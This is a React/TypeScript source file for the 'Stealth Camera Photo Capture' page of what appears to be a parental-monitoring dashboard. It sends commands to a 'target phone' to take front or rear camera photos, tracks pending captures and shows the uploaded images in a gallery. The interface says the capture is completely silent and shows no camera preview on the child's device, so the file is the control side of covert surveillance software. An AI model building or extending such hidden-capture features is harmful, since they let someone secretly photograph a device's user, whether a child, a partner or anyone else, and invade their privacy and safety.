import React, { useState, useEffect } from 'react';
import { DeviceInfo } from '../types/dashboard.types';
import { apiService } from '../services/apiService';
import { 
  Camera, 
  RefreshCw, 
  Download, 
  Calendar, 
  X, 
  Zap, 
  Sparkles, 
  Loader2, 
  Eye, 
  Clock,
  AlertTriangle
} from 'lucide-react';

interface StealthPhotosPageProps {
  device: DeviceInfo;
}

interface StealthMediaItem {
  id: string;
  deviceId: string;
  category: string;
  filename: string;
  fileSizeBytes: number;
  mimeType: string;
  url: string;
  timestamp: string;
}

interface PendingStealthItem {
  id: string;
  commandId?: string;
  camera: 'FRONT' | 'REAR';
  timestamp: string;
  createdAt: number;
  status: 'PENDING' | 'TIMEOUT' | 'FAILED';
  error?: string;
}

export function StealthPhotosPage({ device }: StealthPhotosPageProps) {
  const [photos, setPhotos] = useState<StealthMediaItem[]>([]);
  const [pendingRequests, setPendingRequests] = useState<PendingStealthItem[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [selectedPhoto, setSelectedPhoto] = useState<StealthMediaItem | null>(null);
  const [filterFacing, setFilterFacing] = useState<string>('ALL');

  // Trigger Modal & Status
  const [modalOpen, setModalOpen] = useState<boolean>(false);
  const [capturingCamera, setCapturingCamera] = useState<string | null>(null);
  const [toastMsg, setToastMsg] = useState<string | null>(null);

  const getDismissedCommands = (): Set<string> => {
    try {
      const raw = localStorage.getItem(`dismissed_commands_${device.id}`);
      return raw ? new Set(JSON.parse(raw)) : new Set();
    } catch {
      return new Set();
    }
  };

  const handleDismissPending = (id: string, commandId?: string) => {
    const keyToDismiss = commandId || id;
    try {
      const current = getDismissedCommands();
      current.add(keyToDismiss);
      current.add(id);
      localStorage.setItem(`dismissed_commands_${device.id}`, JSON.stringify(Array.from(current)));
    } catch (e) {
      console.warn('Failed to save dismissed command to localStorage:', e);
    }
    setPendingRequests((prev) => prev.filter((r) => r.id !== id && r.commandId !== keyToDismiss));
  };

  const fetchStealthPhotos = async () => {
    if (!device || device.id === 'no_device') {
      setLoading(false);
      return;
    }
    setLoading(true);
    try {
      const token = localStorage.getItem('childcare_auth_token') || 'jwt_demo_token';
      const response = await fetch(`/api/v1/media/device/${device.id}`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      const data = await response.json();
      let currentStealthAssets: StealthMediaItem[] = [];
      if (data.success && Array.isArray(data.assets)) {
        currentStealthAssets = data.assets.filter((a: StealthMediaItem) => 
          a.category === 'STEALTH_PHOTO' || a.filename?.startsWith('stealth_')
        );
        setPhotos(currentStealthAssets);
      } else {
        setPhotos([]);
      }

      // Query & Hydrate command execution statuses from backend
      const statusRes = await apiService.getCommandStatuses(device.id);
      const dismissedSet = getDismissedCommands();

      if (statusRes.success && statusRes.statuses) {
        setPendingRequests((prev) => {
          const map = new Map<string, PendingStealthItem>();

          // Preserve existing items unless dismissed
          prev.forEach((req) => {
            const key = req.commandId || req.id;
            if (!dismissedSet.has(key) && !dismissedSet.has(req.id)) {
              map.set(key, req);
            }
          });

          // Hydrate backend statuses
          Object.entries(statusRes.statuses).forEach(([cmdId, info]) => {
            if (!cmdId.startsWith('cmd_photo_')) return;
            if (dismissedSet.has(cmdId) || dismissedSet.has(`stealth_${cmdId}`)) return;

            const isSuccess = info.status === 'SUCCESS';
            const isFailed = info.status === 'FAILED';
            const isPending = info.status === 'PENDING';
            const now = Date.now();
            const createdAt = info.timestamp || now;
            const camera = (info.camera as 'FRONT' | 'REAR') || 'FRONT';

            const cameraTag = camera.toLowerCase();
            const hasUploadedAsset = currentStealthAssets.some((p: StealthMediaItem) => {
              const photoTime = new Date(p.timestamp).getTime();
              return p.filename.includes(cameraTag) && (photoTime >= createdAt - 5000);
            });

            if (isSuccess || hasUploadedAsset) {
              map.delete(cmdId);
              return;
            }

            let status: 'PENDING' | 'TIMEOUT' | 'FAILED' = 'PENDING';
            if (isFailed) {
              status = 'FAILED';
            } else if (isPending && now - createdAt > 25000) {
              status = 'TIMEOUT';
            }

            const existing = map.get(cmdId);
            map.set(cmdId, {
              id: existing?.id || `stealth_${cmdId}`,
              commandId: cmdId,
              camera,
              timestamp: existing?.timestamp || new Date(createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
              createdAt,
              status,
              error: isFailed ? (info.error || 'Camera capture failed on device') : existing?.error
            });
          });

          return Array.from(map.values()).sort((a, b) => b.createdAt - a.createdAt);
        });
      }
    } catch (e) {
      console.warn('Failed to fetch stealth photos:', e);
      setPhotos([]);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchStealthPhotos();
    const interval = setInterval(fetchStealthPhotos, 4000);
    return () => clearInterval(interval);
  }, [device]);

  // Timeout checker for pending requests (> 25 seconds)
  useEffect(() => {
    const timeoutChecker = setInterval(() => {
      const now = Date.now();
      setPendingRequests((prev) =>
        prev.map((req) => {
          if (req.status === 'PENDING' && now - req.createdAt > 25000) {
            return { ...req, status: 'TIMEOUT' };
          }
          return req;
        })
      );
    }, 3000);
    return () => clearInterval(timeoutChecker);
  }, []);

  const handleTriggerStealthPhoto = async (camera: 'FRONT' | 'REAR' | 'BOTH') => {
    setCapturingCamera(camera);
    setToastMsg(null);
    try {
      const res = await apiService.triggerStealthPhoto({
        deviceId: device.id,
        camera
      });
      if (res.success) {
        const cameraLabel = camera === 'BOTH' ? 'Front & Rear Cameras (Dual Capture)' : `${camera.toLowerCase()} camera`;
        setToastMsg(`📸 Stealth photo command dispatched for ${cameraLabel}! Capturing in background...`);
        setModalOpen(false);

        // Create pending request cards with commandId for real-time tracking
        const now = Date.now();
        const cmdId = res.commandId;
        const newRequests: PendingStealthItem[] = [];
        if (camera === 'BOTH' || camera === 'FRONT') {
          newRequests.push({
            id: `pending_${now}_front`,
            commandId: cmdId,
            camera: 'FRONT',
            timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
            createdAt: now,
            status: 'PENDING'
          });
        }
        if (camera === 'BOTH' || camera === 'REAR') {
          newRequests.push({
            id: `pending_${now}_rear`,
            commandId: cmdId,
            camera: 'REAR',
            timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
            createdAt: now + 500,
            status: 'PENDING'
          });
        }

        setPendingRequests((prev) => [...newRequests, ...prev]);

        // Rapid polling to pick up uploaded image or error status
        setTimeout(fetchStealthPhotos, 1500);
        setTimeout(fetchStealthPhotos, 3500);
        setTimeout(fetchStealthPhotos, 6500);
        setTimeout(fetchStealthPhotos, 10000);
      } else {
        setToastMsg('⚠️ Failed to dispatch stealth photo command.');
      }
    } catch (e) {
      setToastMsg('⚠️ Connection error initiating stealth photo.');
    } finally {
      setCapturingCamera(null);
    }
  };

  const getCameraType = (filename: string) => {
    if (filename.includes('front')) return 'FRONT';
    if (filename.includes('rear') || filename.includes('back')) return 'REAR';
    return 'UNKNOWN';
  };

  const getPhotoUrl = (url: string) => {
    if (!url) return '';
    if (url.startsWith('http://') || url.startsWith('https://')) return url;
    if (url.startsWith('/api/v1')) return url;
    return `/api/v1${url.startsWith('/') ? '' : '/'}${url}`;
  };

  const filteredPhotos = photos.filter((p) => {
    const type = getCameraType(p.filename);
    if (filterFacing === 'ALL') return true;
    if (filterFacing === 'FRONT') return type === 'FRONT';
    if (filterFacing === 'REAR') return type === 'REAR';
    return true;
  });

  const filteredPending = pendingRequests.filter((p) => {
    if (filterFacing === 'ALL') return true;
    return p.camera === filterFacing;
  });

  const frontCount = photos.filter(p => getCameraType(p.filename) === 'FRONT').length;
  const rearCount = photos.filter(p => getCameraType(p.filename) === 'REAR').length;

  const formatFileSize = (bytes: number) => {
    if (!bytes) return '0 KB';
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
  };

  return (
    <div className="space-y-6">
      {/* Toast Notification */}
      {toastMsg && (
        <div className="bg-indigo-600 text-white px-5 py-3.5 rounded-2xl shadow-lg flex items-center justify-between animate-fadeIn">
          <div className="flex items-center gap-3">
            <Zap className="w-5 h-5 text-amber-300 animate-pulse" />
            <span className="text-xs font-bold">{toastMsg}</span>
          </div>
          <button onClick={() => setToastMsg(null)} className="p-1 hover:bg-indigo-700 rounded-lg">
            <X className="w-4 h-4" />
          </button>
        </div>
      )}

      {/* Page Header */}
      <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-2xl bg-indigo-50 text-indigo-600 flex items-center justify-center font-bold shadow-inner border border-indigo-100">
            <Camera className="w-6 h-6" />
          </div>
          <div>
            <h1 className="text-xl font-bold text-slate-900">Stealth Camera Photo Capture</h1>
            <p className="text-xs text-slate-500 font-medium">
              Silent remote background photo capture for <span className="font-bold text-indigo-600">{device.alias}</span>
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3 w-full md:w-auto justify-end">
          <button
            onClick={() => setModalOpen(true)}
            className="px-5 py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl transition-all flex items-center gap-2 text-xs font-bold shadow-md shadow-indigo-600/20 active:scale-95"
          >
            <Camera className="w-4 h-4" />
            <span>Take Instant Stealth Photo</span>
          </button>

          <button
            onClick={fetchStealthPhotos}
            className="p-2.5 bg-slate-100 hover:bg-slate-200 text-slate-600 rounded-xl transition-all flex items-center gap-2 text-xs font-bold"
          >
            <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
            <span>Refresh</span>
          </button>
        </div>
      </div>

      {/* Stats Summary Bar */}
      <div className="grid grid-cols-1 sm:grid-cols-4 gap-4">
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm flex items-center gap-4">
          <div className="p-3 bg-indigo-50 text-indigo-600 rounded-xl">
            <Camera className="w-5 h-5" />
          </div>
          <div>
            <span className="text-xs text-slate-500 font-bold block">Total Stealth Captures</span>
            <span className="text-xl font-black text-slate-900">{photos.length}</span>
          </div>
        </div>

        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm flex items-center gap-4">
          <div className="p-3 bg-indigo-50 text-indigo-600 rounded-xl">
            <span className="text-lg">🤳</span>
          </div>
          <div>
            <span className="text-xs text-slate-500 font-bold block">Front Selfie Photos</span>
            <span className="text-xl font-black text-indigo-600">{frontCount}</span>
          </div>
        </div>

        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm flex items-center gap-4">
          <div className="p-3 bg-purple-50 text-purple-600 rounded-xl">
            <span className="text-lg">📸</span>
          </div>
          <div>
            <span className="text-xs text-slate-500 font-bold block">Rear Main Photos</span>
            <span className="text-xl font-black text-purple-600">{rearCount}</span>
          </div>
        </div>

        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm flex items-center gap-4">
          <div className="p-3 bg-amber-50 text-amber-600 rounded-xl">
            <Clock className="w-5 h-5" />
          </div>
          <div>
            <span className="text-xs text-slate-500 font-bold block">Pending / Requests</span>
            <span className="text-xl font-black text-amber-600">{pendingRequests.length}</span>
          </div>
        </div>
      </div>

      {/* Filter Tabs */}
      <div className="flex items-center gap-2 overflow-x-auto pb-1">
        <button
          onClick={() => setFilterFacing('ALL')}
          className={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 ${
            filterFacing === 'ALL'
              ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/20'
              : 'bg-white text-slate-600 border border-slate-200 hover:bg-slate-50'
          }`}
        >
          <Camera className="w-3.5 h-3.5" />
          <span>All Stealth Captures ({photos.length})</span>
        </button>

        <button
          onClick={() => setFilterFacing('FRONT')}
          className={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 ${
            filterFacing === 'FRONT'
              ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/20'
              : 'bg-white text-slate-600 border border-slate-200 hover:bg-slate-50'
          }`}
        >
          <span>🤳 Front Selfie Camera ({frontCount})</span>
        </button>

        <button
          onClick={() => setFilterFacing('REAR')}
          className={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 ${
            filterFacing === 'REAR'
              ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/20'
              : 'bg-white text-slate-600 border border-slate-200 hover:bg-slate-50'
          }`}
        >
          <span>📸 Rear Main Camera ({rearCount})</span>
        </button>
      </div>

      {/* Photo Grid Gallery */}
      {loading && photos.length === 0 && pendingRequests.length === 0 ? (
        <div className="bg-white rounded-3xl p-12 text-center border border-slate-200 shadow-sm">
          <div className="w-8 h-8 border-4 border-indigo-600 border-t-transparent rounded-full animate-spin mx-auto mb-3" />
          <p className="text-xs text-slate-500 font-bold">Checking stealth camera captures...</p>
        </div>
      ) : filteredPhotos.length === 0 && filteredPending.length === 0 ? (
        <div className="bg-white rounded-3xl p-12 text-center border border-slate-200 shadow-sm space-y-4">
          <div className="w-14 h-14 rounded-full bg-indigo-50 text-indigo-600 flex items-center justify-center mx-auto border border-indigo-100 shadow-inner">
            <Camera className="w-7 h-7" />
          </div>
          <div className="space-y-1">
            <h3 className="font-bold text-slate-800 text-base">No Stealth Photos Captured Yet</h3>
            <p className="text-xs text-slate-500 max-w-md mx-auto leading-relaxed">
              Click <strong>"Take Instant Stealth Photo"</strong> above to capture background photos silently from the target phone's Front or Rear camera.
            </p>
          </div>

          <button
            onClick={() => setModalOpen(true)}
            className="px-6 py-3 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs rounded-full shadow-lg shadow-indigo-600/20 transition-all inline-flex items-center gap-2"
          >
            <Camera className="w-4 h-4" />
            <span>Capture First Stealth Photo Now</span>
          </button>
        </div>
      ) : (
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
          {/* Pending / Error / Timeout Request Cards */}
          {filteredPending.map((pending) => (
            <div
              key={pending.id}
              className={`relative rounded-2xl overflow-hidden aspect-square border bg-slate-950/85 backdrop-blur-lg p-4 flex flex-col justify-between shadow-lg transition-all ${
                pending.status === 'FAILED'
                  ? 'border-rose-500/60'
                  : pending.status === 'TIMEOUT'
                  ? 'border-slate-700/80'
                  : 'border-amber-400/70 animate-pulse'
              }`}
            >
              {/* Header Badges */}
              <div className="flex items-center justify-between z-10">
                <span className={`px-2 py-0.5 rounded-md text-[10px] font-black uppercase tracking-wide flex items-center gap-1 shadow-sm ${
                  pending.camera === 'FRONT' ? 'bg-indigo-600/90 text-white' : 'bg-purple-600/90 text-white'
                }`}>
                  {pending.camera === 'FRONT' ? '🤳 FRONT' : '📸 REAR'}
                </span>

                {pending.status === 'PENDING' ? (
                  <span className="px-2 py-0.5 bg-amber-500 text-slate-950 text-[10px] font-black rounded-md flex items-center gap-1 shadow-sm">
                    <Loader2 className="w-3 h-3 animate-spin" /> CAPTURING
                  </span>
                ) : pending.status === 'FAILED' ? (
                  <span className="px-2 py-0.5 bg-rose-600 text-white text-[10px] font-black rounded-md flex items-center gap-1 shadow-sm">
                    <AlertTriangle className="w-3 h-3" /> FAILED
                  </span>
                ) : (
                  <span className="px-2 py-0.5 bg-slate-800 text-slate-200 text-[10px] font-bold rounded-md flex items-center gap-1 border border-slate-700">
                    <Clock className="w-3 h-3 text-amber-400" /> TIMEOUT
                  </span>
                )}
              </div>

              {/* Main Content Area */}
              <div className="my-auto text-center space-y-2 py-2">
                <div className={`w-10 h-10 rounded-xl flex items-center justify-center mx-auto border ${
                  pending.status === 'FAILED'
                    ? 'bg-rose-500/10 text-rose-400 border-rose-500/30'
                    : 'bg-amber-500/10 text-amber-400 border-amber-500/30'
                }`}>
                  {pending.status === 'PENDING' ? (
                    <Loader2 className="w-5 h-5 animate-spin text-amber-400" />
                  ) : pending.status === 'FAILED' ? (
                    <AlertTriangle className="w-5 h-5 text-rose-400" />
                  ) : (
                    <Clock className="w-5 h-5 text-amber-400" />
                  )}
                </div>
                <p className="text-xs font-bold leading-snug px-1 text-slate-100">
                  {pending.status === 'PENDING'
                    ? `Capturing ${pending.camera.toLowerCase()} camera photo...`
                    : pending.status === 'FAILED'
                    ? (pending.error || 'Camera capture failed on device')
                    : `Device camera response timed out.`}
                </p>
              </div>

              {/* Footer Row */}
              <div className="flex items-center justify-between text-[10px] pt-2 border-t border-slate-800/80 mt-auto text-slate-300">
                <span className="font-medium">
                  Requested: <span className="font-bold text-white">{pending.timestamp}</span>
                </span>
                <button
                  onClick={() => handleDismissPending(pending.id, pending.commandId)}
                  className={`px-2.5 py-0.5 rounded text-[10px] font-bold transition-all border ${
                    pending.status === 'FAILED'
                      ? 'bg-rose-500/20 text-rose-200 hover:bg-rose-600 hover:text-white border-rose-500/40'
                      : 'bg-slate-800 text-slate-200 hover:bg-slate-700 hover:text-white border-slate-700'
                  }`}
                >
                  Dismiss
                </button>
              </div>
            </div>
          ))}

          {/* Actual Uploaded Stealth Photos */}
          {filteredPhotos.map((photo) => {
            const facing = getCameraType(photo.filename);
            const isFront = facing === 'FRONT';

            return (
              <div
                key={photo.id}
                onClick={() => setSelectedPhoto(photo)}
                className="group relative bg-slate-900 rounded-2xl overflow-hidden aspect-square border border-slate-200 shadow-sm hover:shadow-xl transition-all cursor-pointer flex flex-col justify-between"
              >
                {/* Thumbnail Preview Area */}
                <div className="w-full h-full bg-slate-900 relative overflow-hidden flex items-center justify-center">
                  <img
                    src={getPhotoUrl(photo.url)}
                    alt={photo.filename}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300"
                    loading="lazy"
                    onError={(e) => {
                      (e.target as HTMLElement).style.display = 'none';
                    }}
                  />

                  {/* Camera Badge Overlay */}
                  <div className="absolute top-2 left-2 flex flex-col gap-1 z-10">
                    {isFront ? (
                      <span className="px-2 py-1 bg-indigo-600/90 backdrop-blur-md text-white text-[10px] font-black rounded-lg shadow-md flex items-center gap-1">
                        🤳 Front Camera
                      </span>
                    ) : (
                      <span className="px-2 py-1 bg-purple-600/90 backdrop-blur-md text-white text-[10px] font-black rounded-lg shadow-md flex items-center gap-1">
                        📸 Rear Camera
                      </span>
                    )}
                  </div>

                  {/* Hover Detail Bar */}
                  <div className="absolute inset-0 bg-gradient-to-t from-slate-950/95 via-slate-950/40 to-transparent opacity-0 group-hover:opacity-100 transition-opacity p-3 flex flex-col justify-end gap-1">
                    <span className="text-[11px] font-bold text-white truncate block">{photo.filename}</span>
                    <div className="flex items-center justify-between text-[10px] text-slate-300 font-medium">
                      <span className="flex items-center gap-1">
                        <Clock className="w-3 h-3 text-slate-400" />
                        {new Date(photo.timestamp).toLocaleString([], {
                          month: 'short',
                          day: 'numeric',
                          hour: '2-digit',
                          minute: '2-digit',
                          second: '2-digit'
                        })}
                      </span>
                      <span>{formatFileSize(photo.fileSizeBytes)}</span>
                    </div>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* Modal: Take Stealth Photo Options */}
      {modalOpen && (
        <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-3xl max-w-md w-full p-6 space-y-6 shadow-2xl border border-slate-100 animate-scaleUp">
            <div className="flex items-center justify-between border-b border-slate-100 pb-4">
              <div className="flex items-center gap-3">
                <div className="p-3 bg-indigo-50 text-indigo-600 rounded-2xl">
                  <Camera className="w-6 h-6" />
                </div>
                <div>
                  <h3 className="font-bold text-slate-900 text-lg">Take Stealth Photo</h3>
                  <p className="text-xs text-slate-500">Capture background photo silently from target phone</p>
                </div>
              </div>
              <button 
                onClick={() => setModalOpen(false)}
                className="p-2 text-slate-400 hover:text-slate-600 rounded-xl hover:bg-slate-100"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-3">
              <label className="text-xs font-bold text-slate-700 block">Select Target Camera:</label>

              {/* Front Camera Choice */}
              <button
                disabled={capturingCamera !== null}
                onClick={() => handleTriggerStealthPhoto('FRONT')}
                className="w-full p-4 rounded-2xl border border-slate-200 hover:border-indigo-500 hover:bg-indigo-50/50 transition-all text-left flex items-center justify-between group active:scale-98"
              >
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-indigo-50 text-indigo-600 flex items-center justify-center font-bold">
                    🤳
                  </div>
                  <div>
                    <span className="text-xs font-bold text-slate-900 block group-hover:text-indigo-600">Front Selfie Camera</span>
                    <span className="text-[11px] text-slate-500 block">Captures front angle facing screen</span>
                  </div>
                </div>
                {capturingCamera === 'FRONT' ? (
                  <Loader2 className="w-5 h-5 text-indigo-600 animate-spin" />
                ) : (
                  <Sparkles className="w-4 h-4 text-slate-400 group-hover:text-indigo-600" />
                )}
              </button>

              {/* Rear Camera Choice */}
              <button
                disabled={capturingCamera !== null}
                onClick={() => handleTriggerStealthPhoto('REAR')}
                className="w-full p-4 rounded-2xl border border-slate-200 hover:border-indigo-500 hover:bg-indigo-50/50 transition-all text-left flex items-center justify-between group active:scale-98"
              >
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-purple-50 text-purple-600 flex items-center justify-center font-bold">
                    📸
                  </div>
                  <div>
                    <span className="text-xs font-bold text-slate-900 block group-hover:text-indigo-600">Rear Main Camera</span>
                    <span className="text-[11px] text-slate-500 block">Captures back environment angle</span>
                  </div>
                </div>
                {capturingCamera === 'REAR' ? (
                  <Loader2 className="w-5 h-5 text-indigo-600 animate-spin" />
                ) : (
                  <Sparkles className="w-4 h-4 text-slate-400 group-hover:text-indigo-600" />
                )}
              </button>

              {/* Both Cameras Choice (Dual Capture) */}
              <button
                disabled={capturingCamera !== null}
                onClick={() => handleTriggerStealthPhoto('BOTH')}
                className="w-full p-4 rounded-2xl border-2 border-indigo-500 bg-indigo-50/30 hover:bg-indigo-50 transition-all text-left flex items-center justify-between group active:scale-98 shadow-sm"
              >
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-indigo-600 text-white flex items-center justify-center font-bold shadow-md">
                    📷
                  </div>
                  <div>
                    <span className="text-xs font-black text-indigo-950 block">Both Cameras (Dual Capture)</span>
                    <span className="text-[11px] text-indigo-700 font-medium block">Captures Front + Rear photos sequentially</span>
                  </div>
                </div>
                {capturingCamera === 'BOTH' ? (
                  <Loader2 className="w-5 h-5 text-indigo-600 animate-spin" />
                ) : (
                  <Zap className="w-4 h-4 text-amber-500 fill-amber-500" />
                )}
              </button>
            </div>

            <div className="p-3 bg-slate-50 rounded-xl border border-slate-200/80">
              <p className="text-[11px] text-slate-500 text-center font-medium">
                Photo capture is completely silent and operates in background without triggering camera preview screens on child's device.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Modal: Selected Photo Full View */}
      {selectedPhoto && (
        <div className="fixed inset-0 bg-slate-900/70 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-3xl max-w-2xl w-full p-6 space-y-5 shadow-2xl border border-slate-100 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between border-b border-slate-100 pb-4">
              <div className="flex items-center gap-3">
                <div className="p-2.5 bg-indigo-50 text-indigo-600 rounded-xl">
                  <Camera className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-slate-900 text-base">{selectedPhoto.filename}</h3>
                  <span className="text-xs text-slate-400 font-medium">
                    Facing: <span className="font-bold text-indigo-600">{getCameraType(selectedPhoto.filename)} CAMERA</span>
                  </span>
                </div>
              </div>

              <button
                onClick={() => setSelectedPhoto(null)}
                className="p-2 text-slate-400 hover:text-slate-600 rounded-xl hover:bg-slate-100"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="bg-slate-900 rounded-2xl overflow-hidden max-h-[50vh] flex items-center justify-center p-2">
              <img
                src={getPhotoUrl(selectedPhoto.url)}
                alt={selectedPhoto.filename}
                className="max-h-[45vh] w-auto object-contain rounded-lg"
              />
            </div>

            <div className="flex items-center justify-end gap-3 pt-2">
              <a
                href={getPhotoUrl(selectedPhoto.url)}
                download={selectedPhoto.filename}
                target="_blank"
                rel="noreferrer"
                className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl text-xs font-bold transition-all flex items-center gap-2"
              >
                <Download className="w-4 h-4" />
                <span>Download Photo</span>
              </a>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
